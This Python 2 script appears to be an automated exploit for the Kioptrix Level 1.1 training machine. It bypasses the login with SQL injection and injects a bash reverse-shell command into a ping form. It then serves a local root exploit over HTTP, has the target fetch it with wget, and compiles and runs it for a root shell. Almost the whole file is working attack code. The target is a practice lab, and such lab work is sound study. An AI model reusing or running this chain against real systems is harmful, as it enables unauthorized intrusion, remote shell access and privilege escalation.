#!/usr/bin/python
# coding: utf-8
from BaseHTTPServer import BaseHTTPRequestHandler,HTTPServer
from pwn import *
import requests
import threading
import sys


class myHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            print "{+} Got call from %s - dropping local root ;)" %(self.client_address[0])
#            print "{+} Dumping headers for extra info...\n%s" %(self.headers)
            f = open("1.1.c", "rb")
            poc = f.read()
            f.close()
            self.send_response(200)
            self.send_header('Content-type','text/plain')
            self.end_headers()
            self.wfile.write(poc)
            return


def runserver(port):
    try:
        server = HTTPServer(('', port), myHandler)
        print 'Started httpserver on port ' , port
        server.serve_forever()

    except KeyboardInterrupt:
        print '^C received, shutting down the web server'
        server.socket.close()

def get_login_session(target):
    """
This function uses a simple SQL injection vuln to bypass auth and get us a logged-in session.
    """
    url = "http://%s/index.php" %(target)
    injection = "' OR 0=0 #"
    data = {"uname": injection, "psw": "", "btnLogin": "Login"}
    session = requests.Session()
    x=session.post(url, data)
    #print x.text
    return session

def get_shell(target, session, my_ip):
    """
This function uses a post-authentication command injection vulnerability to pop a shell...
    """
    shell_listener = listen()
    backconnect_payload = ";bash -i >& /dev/tcp/%s/%s 0>&1" %(my_ip, shell_listener.lport)
    data = {"ip": backconnect_payload, "submit": "submit"}
    url = "http://%s/pingit.php" %(target)
    try:
        x = session.post(url, data, timeout=3)
    except:
        pass
    return shell_listener

def drop_root_exploit(shell, my_ip):
    """
This function drops a local root exploit on the box by serving it up and wgetting it to the target.
    """
    threading.Thread(target=runserver, args=(8976,)).start()
    wget_cmd = "wget -O /tmp/rootme.c http://%s:8976/1.1.c" %(my_ip)
    shell.sendline(wget_cmd)
    pass

def run_root_exploit(shell):
    """
This function runs the root exploit to pop a root shell.
    """
    root_cmd = "gcc -o /tmp/rootme /tmp/rootme.c;chmod +x /tmp/rootme;/tmp/rootme"
    shell.sendline(root_cmd)

def pop_courtesy_shell(shell):
    shell.interactive()

def pwn(target, my_ip):
    login_session = get_login_session(target=target)
    # et tu pwned motherfucker
    shell = get_shell(target=target, session=login_session, my_ip=my_ip)
    drop_root_exploit(shell=shell, my_ip=my_ip)
    run_root_exploit(shell)
    pop_courtesy_shell(shell)

def main(args):
    print "kioptrix level 1.1 automatic exploitation utility."
    if len(args) != 3:
        sys.exit("use: %s target_ip my_ip" %(args[0]))
    pwn(target=args[1], my_ip=args[2])

if __name__ == "__main__":
    main(args=sys.argv)
